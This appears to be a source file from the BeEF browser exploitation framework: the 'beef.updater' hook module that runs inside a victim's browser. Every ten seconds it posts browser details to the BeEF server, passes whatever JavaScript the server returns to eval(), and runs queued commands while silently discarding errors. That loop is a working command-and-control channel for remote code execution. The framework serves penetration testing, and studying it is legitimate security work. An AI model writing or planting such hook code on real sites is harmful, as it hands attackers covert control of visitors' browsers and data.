/*!
 * @Literal object: beef.updater
 *
 * Object in charge of getting new commands from the BeEF framework and execute them.
 */
beef.updater = {
	
	// Low timeouts combined with the way the framework sends commamd modules result 
	// in instructions being sent repeatedly or complex code. 
	// If you suffer from ADHD, you can decrease this setting.
	timeout: 10000,
	
	// A lock.
	lock: false,
	
	// An object containing all values to be registered and sent by the updater.
	objects: new Object(),
	
	/*
	 * Registers an object to always send when requesting new commands to the framework.
	 * @param: {String} the name of the object.
	 * @param: {String} the value of that object.
	 * 
	 * @example: beef.updater.regObject('java_enabled', 'true');
	 */
	regObject: function(key, value) {
		this.objects[key] = escape(value);
	},
	
	// Checks for new commands from the framework and runs them.
	check: function() {
		if(this.lock == false) {
			if(beef.commands.length > 0) {
				this.execute_commands();
			} else {
				this.get_commands();
			}
		}
		
		setTimeout("beef.updater.check();", beef.updater.timeout);
	},
	
	// Gets new commands from the framework.
	get_commands: function(http_response) {
		try {
			this.lock = true;
			beef.net.request(
				beef.net.beef_url + beef.net.beef_hook,
				'POST',
				function(response) { if(response.length > 0) {eval(response); beef.updater.execute_commands();} },
				beef.updater.build_updater_params()
				);
		} catch(e) {
			this.lock = false;
			return;
		}
		
		this.lock = false;
	},
	
	// Builds the POST parameters to send back to the framework when requesting new commands.
	build_updater_params: function() {
		ret = 'beef_js_cmps=' + beef.components.join(',')
		
		for(key in this.objects) {
			ret += '&' + key + '=' + escape(this.objects[key]);
		}
		
		return ret;
	},
	
	// Executes the received commands if any.
	execute_commands: function() {
		if(beef.commands.length == 0) return;
		
		this.lock = true;
		
		while(beef.commands.length > 0) {
			command = beef.commands.pop();
			try {
				command();
			} catch(e) {}
		}
		
		this.lock = false;
	}
}

beef.regCmp('beef.updater');